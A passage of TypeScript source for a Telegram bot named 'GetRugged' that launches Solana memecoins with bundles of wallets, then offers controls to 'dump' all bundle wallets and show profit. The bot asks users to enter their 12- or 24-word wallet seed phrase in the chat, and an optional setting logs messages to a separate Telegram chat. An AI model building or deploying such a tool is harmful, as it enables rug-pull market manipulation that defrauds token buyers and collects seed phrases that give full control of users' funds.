    return;
  }

  const chatId = getChatId(ctx);
  const session = launchSessions.get(chatId);
  if (!session) {
    return;
  }

  if (session.stage === 'awaiting_name') {
    if (text.length === 0 || text.length > 50) {
      await ctx.reply('Token name must be between 1 and 50 characters. Enter token name again.', launchSetupKeyboard);
      return;
    }

    launchSessions.set(chatId, { stage: 'awaiting_symbol', tokenName: text });
    await ctx.reply(`✅ Name set: ${text}\n\n🔤 Enter SYMBOL (2-25, A-Z)\nExample: $PEPE`, launchSetupKeyboard);
    return;
  }

  if (session.stage === 'awaiting_symbol') {
    const tokenSymbol = text.toUpperCase();
    if (!/^\$?[A-Z]{2,25}$/.test(tokenSymbol)) {
      await ctx.reply('Symbol must be 2-25 letters A-Z. You can prefix it with $. Enter token symbol again.', launchSetupKeyboard);
      return;
    }

    launchSessions.set(chatId, {
      stage: 'awaiting_description',
      tokenName: session.tokenName,
      tokenSymbol,
    });
    await ctx.reply(
      `✅ Symbol set: $${tokenSymbol}\n\n📝 Send the exact description of the token (≤ 500 chars)\n1-2 lines. Avoid links.`,
      launchSetupKeyboard,
    );
    return;
  }

  if (session.stage === 'awaiting_description') {
    if (text.length === 0 || text.length > 500) {
      await ctx.reply('Description must be between 1 and 500 characters. Send it again.', launchSetupKeyboard);
      return;
    }

    if (/(https?:\/\/|www\.|t\.me\/)/i.test(text)) {
      await ctx.reply('Description should not include links. Send the description again without links.', launchSetupKeyboard);
      return;
    }

    launchSessions.set(chatId, {
      stage: 'awaiting_image',
      tokenName: session.tokenName,
      tokenSymbol: session.tokenSymbol,
      description: text,
    });
    await ctx.reply(
      '📷 Upload token image\nPNG/JPG · Square · ≥512px',
      launchSetupKeyboard,
    );
    return;
  }

  if (session.stage === 'awaiting_image') {
    await ctx.reply('📷 Upload a token image to continue.\nPNG/JPG · Square · ≥512px', launchSetupKeyboard);
    return;
  }

  if (session.stage === 'awaiting_socials') {
    await ctx.reply('🔗 Add socials (optional): choose a platform or skip.', buildSocialsKeyboard(session.draft.socials));
    return;
  }

  if (session.stage === 'awaiting_review') {
    await ctx.reply('Review the launch details below, then tap Confirm & Save or Cancel.', reviewKeyboard);
    return;
  }

  if (session.stage === 'awaiting_wallet_connection') {
    try {
      const { address, balance, keypair } = await processWalletConnection(text);
      
      const updatedDraft: LaunchDraft = {
        ...session.draft,
        address,
        balance,
        userKeypair: keypair,
      };
      
      launchSessions.set(chatId, { stage: 'launching', draft: updatedDraft });
      await ctx.reply(`✅ Connected.\nAddress: ${address}\nBalance: ${balance} SOL`);
      await runLaunch(ctx, chatId, updatedDraft);
      launchSessions.delete(chatId);
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      await ctx.reply(`❌ ${errorMessage}\n\nPlease try again with a valid 12/24-word seed phrase:`, launchSetupKeyboard);
    }
    return;
  }

  if (session.stage === 'launching') {
    await ctx.reply('Launch is already in progress. Use /cancel if you want to start over later.');
    return;
  }
});

bot.on('photo', async (ctx) => {
  const chatId = getChatId(ctx);
  const session = launchSessions.get(chatId);
  if (!session || session.stage !== 'awaiting_image') {
    return;
  }

  const photo = ctx.message.photo.at(-1);
  if (!photo) {
    await ctx.reply('Could not read that image. Upload the token image again.', launchSetupKeyboard);
    return;
  }

  launchSessions.set(chatId, {
    stage: 'awaiting_wallet_count',
    tokenName: session.tokenName,
    tokenSymbol: session.tokenSymbol,
    description: session.description,
    imageFileId: photo.file_id,
  });

  await ctx.reply('👥 Choose bundle size (higher = more impact):', walletCountKeyboard);
});

bot.on('callback_query', async (ctx, next) => {
  if (!('data' in ctx.callbackQuery)) {
    return next();
  }

  if (ctx.callbackQuery.data === 'launch_show_wallets') {
    const chatId = getChatId(ctx);
    const result = launchResults.get(chatId);
    if (!result) {
      await ctx.answerCbQuery('No saved wallets yet.');
      return;
    }

    await ctx.answerCbQuery('Showing bundle wallets');
    await replyWithWalletList(ctx, result);
    await replyWithWalletControls(ctx, result);
    return;
  }

  if (ctx.callbackQuery.data === 'launch_test_dump_all') {
    const chatId = getChatId(ctx);
    const result = launchResults.get(chatId);
    if (!result || !result.dryRun) {
      await ctx.answerCbQuery('No launch available.');
      return;
    }

    const updatedResult: LaunchResult = {
      ...result,
      exitedWalletIndexes: result.wallets.map((_, index) => index),
    };
    launchResults.set(chatId, updatedResult);

    await ctx.answerCbQuery('Test dump applied to all wallets');
    await ctx.editMessageReplyMarkup(buildCompactWalletActionsKeyboard(updatedResult).reply_markup);
    await ctx.reply('💥 Dumping all wallets...');
    await publishSimulatedPnl(ctx, updatedResult, 'all');
    return;
  }

  if (ctx.callbackQuery.data === 'launch_test_reset') {
    const chatId = getChatId(ctx);
    const result = launchResults.get(chatId);
    if (!result || !result.dryRun) {
      await ctx.answerCbQuery('No launch available.');
      return;
    }

    const updatedResult: LaunchResult = {
      ...result,
      exitedWalletIndexes: [],
    };
    launchResults.set(chatId, updatedResult);

    await ctx.answerCbQuery('Wallet states reset');
    await ctx.editMessageReplyMarkup(buildCompactWalletActionsKeyboard(updatedResult).reply_markup);
    await ctx.reply('♻️ Wallet states reset.', buildCompactWalletActionsKeyboard(updatedResult));
    return;
  }

  if (ctx.callbackQuery.data.startsWith('launch_test_dump:')) {
    const chatId = getChatId(ctx);
    const result = launchResults.get(chatId);
    if (!result || !result.dryRun) {
      await ctx.answerCbQuery('No launch available.');
      return;
    }

    const walletIndex = Number(ctx.callbackQuery.data.split(':')[1]);
    if (!Number.isInteger(walletIndex) || walletIndex < 0 || walletIndex >= result.wallets.length) {
      await ctx.answerCbQuery('Invalid wallet.');
      return;
    }

    const updatedIndexes = isWalletExited(result, walletIndex)
      ? result.exitedWalletIndexes
      : [...result.exitedWalletIndexes, walletIndex].sort((left, right) => left - right);
    const updatedResult: LaunchResult = {
      ...result,
      exitedWalletIndexes: updatedIndexes,
    };
    launchResults.set(chatId, updatedResult);

    await ctx.answerCbQuery(`Test dump marked for Wallet ${walletIndex + 1}`);
    await ctx.editMessageReplyMarkup(buildCompactWalletActionsKeyboard(updatedResult).reply_markup);
    await ctx.reply(`💥 Dumping Wallet ${walletIndex + 1}...`);
    await publishSimulatedPnl(ctx, updatedResult, walletIndex);
    return;
  }

  if (ctx.callbackQuery.data.startsWith('launch_test_show_pnl:')) {
    const chatId = getChatId(ctx);
    const result = launchResults.get(chatId);
    if (!result || !result.dryRun) {
      await ctx.answerCbQuery('No launch available.');
      return;
    }

    const scope = ctx.callbackQuery.data.split(':')[1];
    if (scope === 'all') {
      const pnl = getSimulatedAllWalletsPnl(result);
      await ctx.answerCbQuery('Showing simulated PnL');
      await ctx.reply(
        `📈 PnL for all wallets\nFunding mode: ${result.simulatedFundingSummary}\nAverage PnL: +${pnl.averagePercent}%\nSOL delta: +${formatSolAmount(pnl.solDelta)} SOL\nUSD delta: +$${formatUsd(pnl.usdDelta)}`,
      );
      return;
    }

    const walletIndex = Number(scope);
    if (!Number.isInteger(walletIndex) || walletIndex < 0 || walletIndex >= result.wallets.length) {
      await ctx.answerCbQuery('Invalid wallet.');
      return;
    }

    const pnl = getSimulatedWalletPnl(walletIndex);
    await ctx.answerCbQuery(`Showing Wallet ${walletIndex + 1} PnL`);
    await ctx.reply(
      `📈 PnL for Wallet ${walletIndex + 1}\nFunding mode: ${result.simulatedFundingSummary}\nPnL: +${pnl.percent}%\nSOL delta: +${formatSolAmount(pnl.solDelta)} SOL\nUSD delta: +$${formatUsd(pnl.usdDelta)}`,
    );
    return;
  }

  if (ctx.callbackQuery.data.startsWith('launch_social_toggle:')) {
    const chatId = getChatId(ctx);
    const session = launchSessions.get(chatId);
    if (!session || session.stage !== 'awaiting_socials') {
      await ctx.answerCbQuery('Start with Launch first.');
      return;
    }

    const platform = ctx.callbackQuery.data.split(':')[1] as SocialPlatform;
    if (!(platform in SOCIAL_PLATFORM_LABELS)) {
      await ctx.answerCbQuery('Invalid social platform.');
      return;
    }

    const socials = session.draft.socials.includes(platform)
      ? session.draft.socials.filter((item) => item !== platform)
      : [...session.draft.socials, platform];
    const updatedDraft: LaunchDraft = {
      ...session.draft,
      socials,
    };
    launchSessions.set(chatId, { stage: 'awaiting_socials', draft: updatedDraft });

    await ctx.answerCbQuery(`${SOCIAL_PLATFORM_LABELS[platform]} ${socials.includes(platform) ? 'added' : 'removed'}`);
    await ctx.editMessageReplyMarkup(buildSocialsKeyboard(updatedDraft.socials).reply_markup);
    return;
  }

  if (ctx.callbackQuery.data === 'launch_socials_done' || ctx.callbackQuery.data === 'launch_socials_skip') {
    const chatId = getChatId(ctx);
    const session = launchSessions.get(chatId);
    if (!session || session.stage !== 'awaiting_socials') {
      await ctx.answerCbQuery('Start with Launch first.');
      return;
    }

    const draft: LaunchDraft = {
      ...session.draft,
      socials: ctx.callbackQuery.data === 'launch_socials_skip' ? [] : session.draft.socials,
    };
    launchSessions.set(chatId, { stage: 'awaiting_review', draft });

    await ctx.answerCbQuery(ctx.callbackQuery.data === 'launch_socials_skip' ? 'Skipping socials' : 'Socials saved');
    await showReview(ctx, draft);
    return;
  }

  if (ctx.callbackQuery.data === 'launch_review_confirm') {
    const chatId = getChatId(ctx);
    const session = launchSessions.get(chatId);
    if (!session || session.stage !== 'awaiting_review') {
      await ctx.answerCbQuery('Start with Launch first.');
      return;
    }

    launchSessions.set(chatId, { stage: 'awaiting_wallet_connection', draft: session.draft });
    await ctx.answerCbQuery('Launch confirmed');
    await ctx.reply(
      '✅ Confirmed & saved.\n\n🔐 Connect a wallet\n🔑 Enter your 12 or 24-word seed phrase:',
      launchSetupKeyboard,
    );
    return;
  }

  if (!ctx.callbackQuery.data.startsWith('launch_wallet_count:')) {
    if (ctx.callbackQuery.data === 'menu_launch') {
      const chatId = getChatId(ctx);
      await ctx.answerCbQuery('Starting launch setup');
      await startLaunchSetup(ctx, chatId);
      return;
    }

    if (ctx.callbackQuery.data === 'menu_wallets') {
      const chatId = getChatId(ctx);
      const result = launchResults.get(chatId);
      await ctx.answerCbQuery('Opening wallets');
      if (!result) {
        await showMainMenu(ctx, 'No bundle wallets are stored for this chat yet.');
        return;
      }

      await replyWithWalletList(ctx, result);
      await replyWithWalletControls(ctx, result);
      return;
    }

    if (ctx.callbackQuery.data === 'menu_portfolio') {
      await ctx.answerCbQuery('Opening portfolio');
      await showMainMenu(ctx, '📂 Portfolio\n\nPortfolio view is coming soon.');
      return;
    }

    if (ctx.callbackQuery.data === 'menu_cancel') {
      const chatId = getChatId(ctx);
      launchSessions.delete(chatId);
      await ctx.answerCbQuery('Setup cancelled');
      await showMainMenu(ctx, '❌ Launch setup cancelled.');
      return;
    }

    if (ctx.callbackQuery.data === 'menu_back') {
      await ctx.answerCbQuery('Back to menu');
      await showMainMenu(ctx, '🏠 Back to main menu.');
      return;
    }

    return next();
  }

  const chatId = getChatId(ctx);
  const session = launchSessions.get(chatId);
  if (!session || session.stage !== 'awaiting_wallet_count') {
    await ctx.answerCbQuery('Start with /launch first.');
    return;
  }

  const walletCountValue = Number(ctx.callbackQuery.data.split(':')[1]);
  if (!isValidWalletCount(walletCountValue)) {
    await ctx.answerCbQuery('Invalid wallet count.');
    return;
  }

  const draft: LaunchDraft = {
    tokenName: session.tokenName,
    tokenSymbol: session.tokenSymbol,
    description: session.description,
    imageFileId: session.imageFileId,
    walletCount: walletCountValue,
    socials: [],
    address: undefined,
    balance: undefined,
  };
  launchSessions.set(chatId, { stage: 'awaiting_socials', draft });

  console.log('Bundle size selected:', {
    chatId,
    walletCount: walletCountValue,
    tokenName: session.tokenName,
    tokenSymbol: session.tokenSymbol,
  });
  await ctx.answerCbQuery(`Using ${walletCountValue} wallets`);
  await ctx.reply(
    `✅ Bundle size set: ${walletCountValue} wallets\n\n🔗 Add socials (optional): choose a platform or skip.`,
    buildSocialsKeyboard([]),
  );
});

const startBot = async () => {
  console.log('Checking Telegram bot token...');
  const me = await withTimeout(bot.telegram.getMe(), 'Telegram getMe');
  console.log(`Telegram bot authenticated as @${me.username ?? me.first_name}`);

  console.log('Starting Telegram polling...');
  bot.launch({ dropPendingUpdates: true }).catch((error) => {
    console.error('Telegram polling stopped unexpectedly:', error);
    process.exitCode = 1;
  });
  console.log('GetRugged online');
  if (isDryRunEnabled()) {
    console.log('DRY_RUN mode enabled: launch flow is simulated locally and no on-chain actions will be sent.');
  }
  if (TELEGRAM_LOG_CHAT_ID) {
    console.log(`Telegram message logging enabled for chat ${TELEGRAM_LOG_CHAT_ID}.`);
  }
};

startBot().catch((error) => {
  console.error('Failed to start bot:', error);
  process.exitCode = 1;
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));